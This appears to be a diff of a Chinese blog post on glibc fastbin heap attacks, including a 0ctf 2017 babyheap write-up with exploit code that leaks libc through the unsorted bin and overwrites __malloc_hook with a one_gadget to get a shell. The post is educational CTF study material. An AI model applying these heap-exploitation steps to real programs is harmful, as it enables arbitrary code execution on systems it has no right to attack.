@@ -177,24 +177,75 @@
             </div>
             <h2 class="post-title">堆漏洞（三）之Fastbin_Attack</h2>
             <div class="post-meta">
-                本文总共273个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共2917个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
-            <h4 id="Use-after-free"><a href="#Use-after-free" class="headerlink" title="Use after free"></a>Use after free</h4><ul>
-<li></li>
+            <h4 id="Fastbin-attack攻击方式总结"><a href="#Fastbin-attack攻击方式总结" class="headerlink" title="Fastbin attack攻击方式总结"></a>Fastbin attack攻击方式总结</h4><ul>
+<li>Double free</li>
+<li>House of spirit</li>
+<li>Alloc to stack</li>
+<li>Arbirary alloc</li>
 </ul>
-<h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h4><h4 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h4><ul>
-<li>控制待分配地址上下区域字段，达到满足free后进入fasbin的条件。</li>
+<p>前两种都是伪造fake_chunk，等到free这个fake_chunk后，就可以继续maoolc得到控制权；而后两种是利用修改chunk的fd指针，在第二次malloc时就能得到控制权。</p>
+<h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h4><ul>
+<li>多次free，构成类似b-&gt;a-&gt;b-&gt;a的多层循环链表，我们第一次malloc得到b可以更改b的fd，之后两次malloc清理，再一次malloc就得到写入fd的chunk。</li>
+</ul>
+<h4 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h4><ul>
+<li>伪造控制待分配地址上下区域字段，达到满足free后进入fasbin的条件。</li>
 <li>先free目标地址，再次malloc时即得到</li>
+<li>在house of xxx系列里详细记录。</li>
 </ul>
 <h4 id="Alloc-to-stack"><a href="#Alloc-to-stack" class="headerlink" title="Alloc to stack"></a>Alloc to stack</h4><ul>
 <li>将一个已经free的chunk的fd指针指向栈上的地址（size区域合法）</li>
 <li>malloc两次即可在第二次得到指向该栈地址的chunk</li>
 </ul>
 <h4 id="Arbirary-alloc"><a href="#Arbirary-alloc" class="headerlink" title="Arbirary alloc"></a>Arbirary alloc</h4><ul>
-<li>即只要满足size字段要求的都可以malloc（是alloc to stack 的一般形式）</li>
+<li>即只要满足size字段要求的都可以malloc（是alloc to stack，或者.bss、<strong>malloc_hook_、</strong>free_hook等全局变量 的一般形式）</li>
 <li>通过使用字节错位等方法绕过，使用的会更频繁。</li>
+</ul>
+<h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><ul>
+<li>信息泄露<ul>
+<li>一般都是需要先泄露libc和heapbase的地址。<ul>
+<li>无’\x00’截断的情况，可以利用small bin的双向链表结构，使得两个释放的chunk的fd，bk分别指向main_arena，和chunk_addr，从而在输出信息时可以泄露地址</li>
+<li>unsorted bin的利用，可以释放unsorted bin，同时使得一个fastbin chunk的fd指针指向该unsorted bin的地址。从而泄露main_arena</li>
+<li>还有利用库函数的内部实现，例如sscanf的（补坑）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>控制malloc的返回地址<ul>
+<li>一般利用fastbin机制，单链表chunk1的fd指向的地址在chunk1分配后就会得到分配。可以通过改写chunk1的fd实现</li>
+<li>还可以伪造top chunk的size，和控制top chunk前一个chunk的prev_size和size的情况控制top chunk的指针。实现任意地址返回chunk。</li>
+</ul>
+</li>
+</ul>
+<h4 id="实例练习"><a href="#实例练习" class="headerlink" title="实例练习"></a>实例练习</h4><ul>
+<li><h5 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf 2017 babyheap"></a>0ctf 2017 babyheap</h5><ul>
+<li><p>提供的功能</p>
+<img src="/2019/04/20/堆漏洞（三）之Fastbin-Attack/1.png" title="[]">
+</li>
+<li><p>存在的漏洞，堆溢出</p>
+<img src="/2019/04/20/堆漏洞（三）之Fastbin-Attack/2.png" title="[]">
+</li>
+<li><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul>
+<li><p>信息泄露</p>
+<ul>
+<li><p>因为不存在use after free，所以难以利用small bin的双链表。只好利用unsorted bin。要想利用成功，首先需要一个fastbin chunk的fd指向这个unsorted bin，同时也要求两者的size一致（显然不一致），所以需要利用堆溢出伪造unsorted bin的size与fastbin一致，同时溢出改写一个已经在fastbin中的chunk，使它的fd指向这个unsortedbin。重新分配就能得到该unsorted bin的地址chunk。之后再重新修正unsorted bin的size，free掉。就实现了fd指向main_arena.。可以泄露了。实现如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#by unsorted bin to leak the address of main_arena</span></span><br><span class="line">allocate(<span class="number">0x10</span>)			<span class="comment">#0</span></span><br><span class="line">allocate(<span class="number">0x10</span>)			<span class="comment">#1</span></span><br><span class="line">allocate(<span class="number">0x10</span>)			<span class="comment">#2</span></span><br><span class="line">allocate(<span class="number">0x10</span>)			<span class="comment">#3</span></span><br><span class="line">allocate(<span class="number">0x80</span>)			<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)					<span class="comment">#fastbin[0] -&gt; idx1 -&gt; idx2 -&gt; null</span></span><br><span class="line"></span><br><span class="line">						</span><br><span class="line">payload0 = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)			<span class="comment">#modify idx1' fd to idx4</span></span><br><span class="line">fill(<span class="number">0</span>, len(payload0), payload0)				</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)						<span class="comment">#modify idx4'size is 0x21(in fastbin[0])</span></span><br><span class="line">fill(<span class="number">3</span>, len(payload3), payload3)	</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)								<span class="comment">#1</span></span><br><span class="line">allocate(<span class="number">0x10</span>)								<span class="comment">#2 return is address of idx4</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)	<span class="comment">#modify idx4's size to in unsorted bin</span></span><br><span class="line">fill(<span class="number">3</span>, len(payload3), payload3)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x80</span>)								<span class="comment">#5 avoid idx consliate with top chunk</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x4526a</span> + libc_base</span><br><span class="line">__malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>控制malloc的返回地址。首先要伪造fake_chunk的size，再将fake_chunk的地址写入fastbin的fd指针。size的满足可以借助于错位字节实现（因为并没有检查内存对齐），一般__malloc_hook的错位0x23字节有0x7f做size。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#fake chunk at __malloc_hook</span></span><br><span class="line">allocate(<span class="number">0x60</span>)								<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">fake_chunk = __malloc_hook - <span class="number">0x23</span></span><br><span class="line">fill(<span class="number">2</span>, len(p64(fake_chunk)), p64(fake_chunk))		<span class="comment">#write the idx4's address</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"fake_chunk ==&gt; "</span> + hex(fake_chunk)</span><br><span class="line">allocate(<span class="number">0x60</span>)								<span class="comment">#4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)								<span class="comment">#6 idx' 4 fd is our fake_chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">'a'</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">4</span>, <span class="number">8</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">fill(<span class="number">6</span>, len(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>这些攻击方法在其他的地方会结合一些手法一同使用，达到目的。灵活使用，多猜想，多调试。多看glibc的源码分析。</li>
 </ul>
 
         </div>
